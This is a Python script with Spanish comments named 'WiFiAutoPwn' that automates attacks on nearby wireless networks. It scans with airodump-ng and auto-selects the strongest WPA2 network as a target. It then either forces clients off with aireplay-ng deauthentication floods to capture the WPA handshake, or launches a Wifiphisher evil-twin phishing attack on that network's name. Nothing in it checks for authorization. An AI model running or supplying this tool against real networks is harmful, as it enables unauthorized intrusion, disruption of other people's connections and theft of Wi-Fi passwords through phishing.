#!/usr/bin/env python3
import os
import re
import sys
import time
import subprocess
from dataclasses import dataclass
from typing import List, Optional

# Configuración de herramientas
AIRODUMP = "airodump-ng"
AIREPLAY = "aireplay-ng"
HCXDUMP = "hcxdumptool"
HASHCAT = "hashcat"
WIFIPHISHER = "wifiphisher"
WORDLISTS = "/usr/share/wordlists/"

@dataclass
class WiFiNetwork:
    bssid: str
    channel: str
    essid: str
    power: int
    encryption: str

@dataclass
class Handshake:
    bssid: str
    essid: str
    file: str

class WiFiAutoPwn:
    def __init__(self, interface: str):
        self.interface = interface
        self.monitor_interface = f"{interface}mon"
        self.target: Optional[WiFiNetwork] = None
        self.handshake: Optional[Handshake] = None
        self.wordlist = f"{WORDLISTS}rockyou.txt"

        self._kill_conflicting_processes()
        self._enable_monitor_mode()

    def _run_command(self, command: str, background: bool = False) -> Optional[str]:
        try:
            if background:
                subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return None
            result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            print(f"[!] Error en comando: {command}\n{e.stderr}")
            return None

    def _kill_conflicting_processes(self):
        self._run_command("sudo airmon-ng check kill")

    def _enable_monitor_mode(self):
        print(f"[*] Iniciando modo monitor en {self.interface}...")
        self._run_command(f"sudo airmon-ng start {self.interface}")

    def scan_networks(self, duration: int = 15) -> List[WiFiNetwork]:
        print("[*] Escaneando redes...")
        output_base = f"/tmp/scan_{int(time.time())}"
        output_file = f"{output_base}-01.csv"
        cmd = f"sudo {AIRODUMP} -w {output_base} --output-format csv {self.monitor_interface}"
        self._run_command(cmd, background=True)
        time.sleep(duration)
        self._run_command(f"sudo pkill -f {AIRODUMP}")

        # Esperar un momento para que el archivo se cree
        timeout = 5
        waited = 0
        while not os.path.exists(output_file) and waited < timeout:
            time.sleep(1)
            waited += 1

        if not os.path.exists(output_file):
            print("[!] No se encontró el archivo de salida. Verifica la interfaz y el tiempo de escaneo.")
            return []

        networks = []
        try:
            with open(output_file, "r") as f:
                lines = f.readlines()
                # Ignorar las primeras tres líneas (cabecera)
                for line in lines[3:]:
                    if "Station" in line:
                        break
                    parts = re.split(r'\s*,\s*', line.strip())
                    if len(parts) >= 14:
                        try:
                            power = int(parts[8].strip())
                        except ValueError:
                            power = 0
                        networks.append(WiFiNetwork(
                            bssid=parts[0].strip(),
                            channel=parts[3].strip(),
                            essid=parts[13].strip()[1:-1],
                            power=power,
                            encryption=parts[5].strip()
                        ))
        except Exception as e:
            print(f"[!] Error al leer el archivo: {e}")
        return networks

    def select_target(self, networks: List[WiFiNetwork]):
        if not networks:
            raise ValueError("No se encontraron redes para seleccionar un objetivo.")
        target = max(
            [n for n in networks if 'WPA2' in n.encryption],
            key=lambda x: x.power,
            default=None
        )
        if target is None:
            raise ValueError("No se encontró una red WPA2 adecuada.")
        self.target = target
        print(f"[+] Objetivo seleccionado: {target.essid} ({target.bssid})")

    def capture_handshake(self, attack_time: int = 300):
        if not self.target:
            raise ValueError("No se ha seleccionado objetivo")
        print("[*] Iniciando captura de handshake...")
        output_base = f"/tmp/handshake_{self.target.essid}_{int(time.time())}"
        capture_cmd = f"sudo {AIRODUMP} -c {self.target.channel} --bssid {self.target.bssid} -w {output_base} {self.monitor_interface}"
        self._run_command(capture_cmd, background=True)
        deauth_cmd = f"sudo {AIREPLAY} -0 10 -a {self.target.bssid} {self.monitor_interface}"
        self._run_command(deauth_cmd, background=True)
        time.sleep(attack_time)
        cap_file = f"{output_base}-01.cap"
        if os.path.exists(cap_file):
            self.handshake = Handshake(self.target.bssid, self.target.essid, cap_file)
            print("[+] Handshake capturado!")
        else:
            print("[!] No se capturó handshake")

    def wifiphisher_attack(self):
        if not self.target:
            raise ValueError("No se ha seleccionado objetivo")
        print("[*] Ejecutando ataque de phishing con Wifiphisher...")
        phisher_cmd = f"sudo {WIFIPHISHER} -aI {self.interface} -e '{self.target.essid}' --force-hostapd"
        self._run_command(phisher_cmd, background=True)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        interface = sys.argv[1]
    else:
        interface = input("Interfaz WiFi (ej: wlan0): ").strip()
    tool = WiFiAutoPwn(interface)
    networks = tool.scan_networks()
    if not networks:
        print("[!] No se detectaron redes. Revisa la configuración o el tiempo de escaneo.")
        sys.exit(1)
    for i, net in enumerate(networks):
        print(f"{i+1}. {net.essid} ({net.bssid}) - {net.encryption}")
    tool.select_target(networks)
    option = input("1. Capturar Handshake\n2. Ataque de Phishing (Wifiphisher)\nSeleccione opción: ")
    if option == "1":
        tool.capture_handshake()
    elif option == "2":
        tool.wifiphisher_attack()
    else:
        print("[!] Opción inválida")

